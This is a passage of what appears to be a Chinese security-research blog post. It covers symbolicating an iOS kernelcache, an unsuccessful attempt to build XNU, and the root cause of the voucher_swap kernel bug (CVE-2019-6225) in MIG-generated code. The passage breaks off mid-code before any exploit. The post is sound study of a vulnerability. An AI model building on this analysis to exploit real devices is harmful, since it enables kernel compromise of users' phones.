class="line">0xfffffff0060fdd80:com.apple.driver.AppleBasebandPCIMAVPDP</span><br><span class="line">0xfffffff0060fea00:com.apple.driver.AppleDiagnosticDataAccessReadOnly</span><br><span class="line">0xfffffff0060ff180:com.apple.iokit.IOAcceleratorFamily2</span><br><span class="line">0xfffffff006108f40:com.apple.AGXG5P</span><br><span class="line">0xfffffff006119b40:com.apple.driver.AppleBiometricServices</span><br><span class="line">0xfffffff00611a7c0:com.apple.driver.AppleS5L8960XUSB</span><br></pre></td></tr></table></figure>

<p>据说在越狱设备的<code>/System/Library/Caches/com.apple.kernelcaches/</code>目录下可以找到解压的kernelcache，但是我没找到。	</p>
<p>Kernelcache符号，iOS12之后是不带kernelcache符号的，但是Apple误发了一个带有符号的beta版本，通过jtool2的analyze选项，可以分析kernelcache的符号并保存到文件中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ ~/Downloads/jtool2/jtool2 --analyze kernelcache.release.iphone7</span><br><span class="line">Loaded 268/45/3/0  matchers</span><br><span class="line">Analyzing kernelcache..</span><br><span class="line">This is a new-style A8 kernelcache (Darwin Kernel Version 18.2.0: Tue Oct 16 21:02:34 PDT 2018; root:xnu-4903.222.5~1/RELEASE_ARM64_T7000)</span><br><span class="line">-- Processing __TEXT_EXEC.__text..</span><br><span class="line">Disassembling 19389120 bytes from address 0xfffffff007680000 (offset 0x67c000):</span><br><span class="line">__ZN11OSMetaClassC2EPKcPKS_j is 0xfffffff007cb84bc (OSMetaClass)</span><br><span class="line">Analyzing __DATA.__data..</span><br><span class="line">Got _localnode_id @0xfffffff008918640</span><br><span class="line">Analyzing __DATA.__sysctl_set..</span><br><span class="line">Analyzing fuctions...</span><br><span class="line">Can<span class="string">&#x27;t get realhost :-(</span></span><br><span class="line"><span class="string">Analyzing __DATA_CONST.. (1st pass)</span></span><br><span class="line"><span class="string">LAST ARG0 : fffffff00762f420 , fffffff00717a750, 0</span></span><br><span class="line"><span class="string">processing flows...</span></span><br><span class="line"><span class="string">Analyzing __DATA_CONST.. (2nd pass)</span></span><br><span class="line"><span class="string">GOT PTHREAD SHIMS! (0xfffffff0074abbf0)</span></span><br><span class="line"><span class="string">Got 1708 IOKit Classes</span></span><br><span class="line"><span class="string">opened companion file ./kernelcache.release.iphone7.ARM64.9DBCEF3B-873D-358D-B74B-CC7DDDC7546B</span></span><br><span class="line"><span class="string">Dumping symbol cache to file</span></span><br><span class="line"><span class="string">Symbolicated 7318 symbols and 62941 functions</span></span><br></pre></td></tr></table></figure>

<h2 id="XNU编译"><a href="#XNU编译" class="headerlink" title="XNU编译"></a>XNU编译</h2><p>先看一下源码结构：</p>
<ul>
<li><code>config</code>- 为支持的架构和平台配置导出的 api。</li>
<li><code>SETUP</code>- 用于配置内核、版本控制和 kextsymbol 管理的基本工具集。</li>
<li><code>EXTERNAL_HEADERS</code>- 来自其他项目的头文件，以避免构建时的重复依赖。这些头文件应在源更新时定期同步。</li>
<li><code>libkern</code>- 用于处理驱动程序和 kexts 的 C++ IOKit 库代码。</li>
<li><code>libsa</code>- 用于启动的内核引导代码。</li>
<li><code>libsyscall</code>- 用户空间程序的系统调用库接口。</li>
<li><code>libkdd</code>- 用于解析内核数据（如内核分块数据）的用户库的源代码。</li>
<li><code>makedefs</code>- 内核构建的顶级规则和定义。</li>
<li><code>osfmk</code>- 基于 Mach 内核的子系统。</li>
<li><code>pexpert</code>- 平台特定代码，如中断处理、原子等。</li>
<li><code>security</code>- 强制访问检查策略接口和相关实现。</li>
<li><code>bsd</code>- BSD子系统代码。</li>
<li><code>tools</code>- 一组用于测试、调试和分析内核的实用程序。</li>
</ul>
<h3 id="编译-未成功"><a href="#编译-未成功" class="headerlink" title="编译(未成功)"></a><em>编译(未成功)</em></h3><blockquote>
<p>可以使用<a target="_blank" rel="noopener" href="https://kernelshaman.blogspot.com/2021/02/building-xnu-for-macos-112-intel-apple.html">这里</a>的脚本进行编译，亲测有效。</p>
</blockquote>
<p>先根据XNU源码版本，确定在<a target="_blank" rel="noopener" href="https://opensource.apple.com/releases/">开源代码</a>中的位置，以下以<a target="_blank" rel="noopener" href="https://opensource.apple.com/tarballs/xnu/xnu-4903.221.2.tar.gz">xnu-4903.221.2</a>为例进行说明。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TARBALLS=https://opensource.apple.com/tarballs</span><br><span class="line"><span class="comment"># 下载需要用到源码，对应XNU的版本</span></span><br><span class="line">curl -O <span class="variable">$&#123;TARBALLS&#125;</span>/dtrace/dtrace-284.200.15.tar.gz</span><br><span class="line">curl -O <span class="variable">$&#123;TARBALLS&#125;</span>/AvailabilityVersions/AvailabilityVersions-33.200.4.tar.gz</span><br><span class="line">curl -O <span class="variable">$&#123;TARBALLS&#125;</span>/libdispatch/libdispatch-1008.220.2.tar.gz</span><br></pre></td></tr></table></figure>

<h4 id="编译dtrace"><a href="#编译dtrace" class="headerlink" title="编译dtrace"></a>编译dtrace</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar xf dtrace-284.200.15.tar.gz</span><br><span class="line"><span class="built_in">cd</span> dtrace-284.200.15.tar.gz</span><br><span class="line"></span><br><span class="line">xcodebuild install -sdk macosx -target ctfconvert \</span><br><span class="line">-target ctfdump -target ctfmerge \</span><br><span class="line">ARCHS=<span class="string">&#x27;x86_64 arm64&#x27;</span> VALID_ARCHS=<span class="string">&#x27;x86_64 arm64&#x27;</span> DSTROOT=<span class="variable">$PWD</span>/dst</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> TOOLCHAIN=`<span class="built_in">cd</span> $(xcrun -sdk macosx -show-sdk-platform-path)/../../Toolchains/XcodeDefault.xctoolchain &amp;&amp; <span class="built_in">pwd</span>`</span><br><span class="line"><span class="built_in">sudo</span> ditto <span class="string">&quot;<span class="variable">$PWD</span>/dst/<span class="variable">$TOOLCHAIN</span>&quot;</span> <span class="string">&quot;<span class="variable">$TOOLCHAIN</span>&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="编译错误"><a href="#编译错误" class="headerlink" title="编译错误"></a>编译错误</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: <span class="string">&#x27;elf.h&#x27;</span> file not found with &lt;angled&gt; include; use <span class="string">&quot;quotes&quot;</span> instead</span><br></pre></td></tr></table></figure>

<p>没找到解决方案</p>
<h4 id="编译AvailabilityVersions"><a href="#编译AvailabilityVersions" class="headerlink" title="编译AvailabilityVersions"></a>编译AvailabilityVersions</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar zxf AvailabilityVersions-33.200.4.tar.gz</span><br><span class="line"><span class="built_in">cd</span> AvailabilityVersions-33.200.4</span><br><span class="line">make install</span><br><span class="line"><span class="built_in">sudo</span> ditto <span class="string">&quot;<span class="variable">$PWD</span>/dst/usr/local/libexec&quot;</span> \</span><br><span class="line"><span class="string">&quot;<span class="subst">$(xcrun -sdk macosx -show-sdk-path)</span>/usr/local/libexec&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="编译libdispatch"><a href="#编译libdispatch" class="headerlink" title="编译libdispatch"></a>编译libdispatch</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> libdispatch-1008.220.2</span><br><span class="line">xcodebuild install -sdk macosx ARCHS=<span class="string">&#x27;x86_64 arm64e&#x27;</span> \</span><br><span class="line">VALID_ARCHS=<span class="string">&#x27;x86_64 arm64e&#x27;</span> -target libfirehose_kernel \</span><br><span class="line">PRODUCT_NAME=firehose_kernel DSTROOT=<span class="variable">$PWD</span>/dst</span><br><span class="line"><span class="built_in">sudo</span> ditto <span class="string">&quot;<span class="variable">$PWD</span>/dst/usr/local&quot;</span> \</span><br><span class="line"><span class="string">&quot;<span class="subst">$(xcrun -sdk macosx -show-sdk-path)</span>/usr/local&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h4><p>安装XNU头文件，依赖于前面的编译结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> xnu-4903.221.2</span><br><span class="line">make SDKROOT=macosx ARCH_CONFIGS=<span class="string">&quot;X86_64 ARM64&quot;</span> installhdrs</span><br><span class="line"><span class="built_in">sudo</span> ditto <span class="string">&quot;<span class="variable">$PWD</span>/BUILD/dst&quot;</span> <span class="string">&quot;<span class="subst">$(xcrun -sdk macosx -show-sdk-path)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>内核编译可以基于<code>KERNEL_CONFIGS</code>&amp;<code>ARCH_CONFIGS</code>变量作为参数构建内核：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make SDKROOT=&lt;sdkroot&gt; ARCH_CONFIGS=&lt;arch&gt; KERNEL_CONFIGS=&lt;variant&gt;</span><br></pre></td></tr></table></figure>

<p>参数解释：</p>
<ul>
<li><code>&lt;sdkroot&gt;</code>：磁盘上 MacOS SDK 的路径（默认为<code>/</code>）。</li>
<li><code>&lt;variant&gt;</code>: 可以是<code>debug</code>, <code>development</code>, <code>release</code>,<code>profile</code>并在整个内核代码中配置编译标志和断言。</li>
<li><code>&lt;arch&gt;</code>：编译架构。（例如<code>i386</code>或<code>X86_64</code>）</li>
</ul>
<p>一些编译示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ make SDKROOT=macosx.internal ARCH_CONFIGS=X86_64 KERNEL_CONFIGS=DEVELOPMENT</span><br><span class="line">$ make SDKROOT=macosx.internal ARCH_CONFIGS=X86_64 KERNEL_CONFIGS=<span class="string">&quot;RELEASE DEVELOPMENT DEBUG&quot;</span></span><br></pre></td></tr></table></figure>

<p>直接<code>make</code>表示架构设置为本地架构，默认内核配置为<code>development</code>。</p>
<p>编译没成功，不知道是不是SDK不匹配的原因。</p>
<h1 id="voucher-sawp漏洞的发现"><a href="#voucher-sawp漏洞的发现" class="headerlink" title="voucher_sawp漏洞的发现"></a>voucher_sawp漏洞的发现</h1><p>漏洞编号为CVE-2019-6225，存在漏洞的xnu内核代码为<a target="_blank" rel="noopener" href="https://opensource.apple.com/tarballs/xnu/xnu-4903.221.2.tar.gz">xnu-4903.221.2</a>。漏洞出现在task_swap_mach_voucher()函数中，主要是MIG生成代码导致的引用计数问题。创建或复制对象会将其引用计数加1，而销毁或覆盖对象会将其引用计数减1。如果对象的引用计数达到零，则将释放该对象。在内存有限的系统中，引用计数比垃圾回收(它是循环发生的，可能会耗费时间)更有效，因为可以在对象的引用计数为零时立即释放对象，从而提高了系统的整体响应能力。</p>
<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>问题出现在<code>task_swap_mach_voucher()</code>（<code>osfmk/kern/task.c</code>）中，功能就是用新的voucher替换旧的voucher：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Placeholders for the task set/get voucher interfaces */</span></span><br><span class="line">......</span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">task_swap_mach_voucher</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">task_t</span>			task,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_voucher_t</span>		new_voucher,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_voucher_t</span>		*in_out_old_voucher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (TASK_NULL == task)</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_TASK;</span><br><span class="line"></span><br><span class="line">	*in_out_old_voucher = new_voucher;</span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据注释信息可知，<code>task_swap_mach_voucher</code>函数是一个占位符。可在<code>osfmk/mach/task.defs</code>中找到它：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">routine <span class="title function_">task_swap_mach_voucher</span><span class="params">(</span></span><br><span class="line"><span class="params">		task		: <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">		new_voucher	: <span class="type">ipc_voucher_t</span>;</span></span><br><span class="line"><span class="params">	inout	old_voucher	: <span class="type">ipc_voucher_t</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>这意味着它实际上是Mach API，因为MIG def文件为Mach接口生成代码。<code>/BUILD/obj/RELEASE_X86_64/osfmk/mach/task.h</code>中可以找到此函数的Mach消息格式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push, 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">mach_msg_header_t</span> Head;</span><br><span class="line">		<span class="comment">/* start of the kernel processed data */</span></span><br><span class="line">		<span class="type">mach_msg_body_t</span> msgh_body;</span><br><span class="line">		<span class="type">mach_msg_port_descriptor_t</span> old_voucher;</span><br><span class="line">		<span class="comment">/* end of the kernel processed data */</span></span><br><span class="line">	&#125; __Reply__task_swap_mach_voucher_t __attribute__((unused));</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(pop)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p><code>/BUILD/obj/RELEASE_X86_64/osfmk/RELEASE/mach/task_server.c</code>中可以看到对请求执行的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mig_internal <span class="type">kern_return_t</span> __MIG_check__Request__task_swap_mach_voucher_t(__attribute__((__unused__)) __Request__task_swap_mach_voucher_t *In0P)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">typedef</span> __Request__task_swap_mach_voucher_t __Request;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigTypeCheck</span></span><br><span class="line">	<span class="keyword">if</span> (!(In0P-&gt;Head.msgh_bits &amp; MACH_MSGH_BITS_COMPLEX) ||</span><br><span class="line">	    (In0P-&gt;msgh_body.msgh_descriptor_count != <span class="number">2</span>) ||</span><br><span class="line">	    (In0P-&gt;Head.msgh_size != (<span class="type">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(__Request)))</span><br><span class="line">		<span class="keyword">return</span> MIG_BAD_ARGUMENTS;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* __MigTypeCheck */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigTypeCheck</span></span><br><span class="line">	<span class="keyword">if</span> (In0P-&gt;new_voucher.type != MACH_MSG_PORT_DESCRIPTOR ||</span><br><span class="line">	    In0P-&gt;new_voucher.disposition != <span class="number">17</span>)</span><br><span class="line">		<span class="keyword">return</span> MIG_TYPE_ERROR;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* __MigTypeCheck */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigTypeCheck</span></span><br><span class="line">	<span class="keyword">if</span> (In0P-&gt;old_voucher.type != MACH_MSG_PORT_DESCRIPTOR ||</span><br><span class="line">	    In0P-&gt;old_voucher.disposition != <span class="number">17</span>)</span><br><span class="line">		<span class="keyword">return</span> MIG_TYPE_ERROR;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* __MigTypeCheck */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> MACH_MSG_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Routine task_swap_mach_voucher */</span></span><br><span class="line">mig_internal novalue _Xtask_swap_mach_voucher</span><br><span class="line">	(<span class="type">mach_msg_header_t</span> *InHeadP, <span class="type">mach_msg_header_t</span> *OutHeadP)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push, 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">mach_msg_header_t</span> Head;</span><br><span class="line">		<span class="comment">/* start of the kernel processed data */</span></span><br><span class="line">		<span class="type">mach_msg_body_t</span> msgh_body;</span><br><span class="line">		<span class="type">mach_msg_port_descriptor_t</span> new_voucher;</span><br><span class="line">		<span class="type">mach_msg_port_descriptor_t</span> old_voucher;</span><br><span class="line">		<span class="comment">/* end of the kernel processed data */</span></span><br><span class="line">		<span class="type">mach_msg_trailer_t</span> trailer;</span><br><span class="line">	&#125; Request __attribute__((unused));</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(pop)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">typedef</span> __Request__task_swap_mach_voucher_t __Request;</span><br><span class="line">	<span class="keyword">typedef</span> __Reply__task_swap_mach_voucher_t Reply __attribute__((unused));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * typedef struct &#123;</span></span><br><span class="line"><span class="comment">	 * 	mach_msg_header_t Head;</span></span><br><span class="line"><span class="comment">	 * 	NDR_record_t NDR;</span></span><br><span class="line"><span class="comment">	 * 	kern_return_t RetCode;</span></span><br><span class="line"><span class="comment">	 * &#125; mig_reply_error_t;</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	Request *In0P = (Request *) InHeadP;</span><br><span class="line">	Reply *OutP = (Reply *) OutHeadP;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>	__MIG_check__Request__task_swap_mach_voucher_t__defined</span></span><br><span class="line">	<span class="type">kern_return_t</span> check_result;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* __MIG_check__Request__task_swap_mach_voucher_t__defined */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigKernelSpecificCode</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	UseStaticTemplates</span></span><br><span class="line">	<span class="type">const</span> <span class="type">static</span> <span class="type">mach_msg_port_descriptor_t</span> old_voucherTemplate = &#123;</span><br><span class="line">		<span class="comment">/* name = */</span>		MACH_PORT_NULL,</span><br><span class="line">		<span class="comment">/* pad1 = */</span>		<span class="number">0</span>,</span><br><span class="line">		<span class="comment">/* pad2 = */</span>		<span class="number">0</span>,</span><br><span class="line">		<span class="comment">/* disp = */</span>		<span class="number">17</span>,</span><br><span class="line">		<span class="comment">/* type = */</span>		MACH_MSG_PORT_DESCRIPTOR,</span><br><span class="line">	&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* UseStaticTemplates */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	UseStaticTemplates</span></span><br><span class="line">	<span class="type">const</span> <span class="type">static</span> <span class="type">mach_msg_port_descriptor_t</span> old_voucherTemplate = &#123;</span><br><span class="line">		<span class="comment">/* name = */</span>		MACH_PORT_NULL,</span><br><span class="line">		<span class="comment">/* pad1 = */</span>		<span class="number">0</span>,</span><br><span class="line">		<span class="comment">/* pad2 = */</span>		<span class="number">0</span>,</span><br><span class="line">		<span class="comment">/* disp = */</span>		<span class="number">19</span>,</span><br><span class="line">		<span class="comment">/* type = */</span>		MACH_MSG_PORT_DESCRIPTOR,</span><br><span class="line">	&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* UseStaticTemplates */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __MigKernelSpecificCode */</span></span></span><br><span class="line">	<span class="type">kern_return_t</span> RetCode;</span><br><span class="line">	<span class="type">task_t</span> task;</span><br><span class="line">	<span class="type">ipc_voucher_t</span> new_voucher;</span><br><span class="line">	<span class="type">ipc_voucher_t</span> old_voucher;</span><br><span class="line"></span><br><span class="line">	__DeclareRcvRpc(<span class="number">3441</span>, <span class="string">&quot;task_swap_mach_voucher&quot;</span>)</span><br><span class="line">	__BeforeRcvRpc(<span class="number">3441</span>, <span class="string">&quot;task_swap_mach_voucher&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	defined(__MIG_check__Request__task_swap_mach_voucher_t__defined)</span></span><br><span class="line">	check_result = __MIG_check__Request__task_swap_mach_voucher_t((__Request *)In0P);</span><br><span class="line">	<span class="keyword">if</span> (check_result != MACH_MSG_SUCCESS)</span><br><span class="line">		&#123; MIG_RETURN_ERROR(OutP, check_result); &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* defined(__MIG_check__Request__task_swap_mach_voucher_t__defined) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	UseStaticTemplates</span></span><br><span class="line">	OutP-&gt;old_voucher = old_voucherTemplate;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span>	<span class="comment">/* UseStaticTemplates */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __MigKernelSpecificCode</span></span><br><span class="line">	OutP-&gt;old_voucher.disposition = <span class="number">17</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	OutP-&gt;old_voucher.disposition = <span class="number">19</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __MigKernelSpecificCode */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !(defined(KERNEL) &amp;&amp; defined(__LP64__))</span></span><br><span class="line">	OutP-&gt;old_voucher.pad1 = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	OutP-&gt;old_voucher.pad2 = <span class="number">0</span>;</span><br><span class="line">	OutP-&gt;old_voucher.type = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(KERNEL)</span></span><br><span class="line">	OutP-&gt;old_voucher.pad_end = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* UseStaticTemplates */</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	task = convert_port_to_task(In0P-&gt;Head.msgh_request_port);</span><br><span class="line"></span><br><span class="line">	new_voucher = convert_port_to_voucher(In0P-&gt;new_voucher.name);</span><br><span class="line"></span><br><span class="line">	old_voucher = convert_port_to_voucher(In0P-&gt;old_voucher.name);</span><br><span class="line"></span><br><span class="line">	RetCode = task_swap_mach_voucher(task, new_voucher, &amp;old_voucher);</span><br><span class="line">	ipc_voucher_release(new_voucher);</span><br><span class="line">	task_deallocate(task);</span><br><span class="line">	<span class="keyword">if</span> (RetCode != KERN_SUCCESS) &#123;</span><br><span class="line">		MIG_RETURN_ERROR(OutP, RetCode);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	__MigKernelSpecificCode</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IP_VALID((<span class="type">ipc_port_t</span>)In0P-&gt;old_voucher.name))</span><br><span class="line">		ipc_port_release_send((<span class="type">ipc_port_t</span>)In0P-&gt;old_voucher.name);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IP_VALID((<span class="type">ipc_port_t</span>)In0P-&gt;new_voucher.name))</span><br><span class="line">		ipc_port_release_send((<span class="type">ipc_port_t</span>)In0P-&gt;new_voucher.name);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* 